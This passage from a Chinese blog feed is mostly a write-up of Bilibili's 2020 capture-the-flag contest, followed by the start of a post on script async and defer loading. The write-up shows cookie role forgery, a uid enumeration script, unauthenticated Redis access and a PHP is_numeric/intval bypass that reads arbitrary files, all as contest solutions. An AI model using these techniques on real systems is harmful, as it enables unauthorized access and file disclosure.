class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 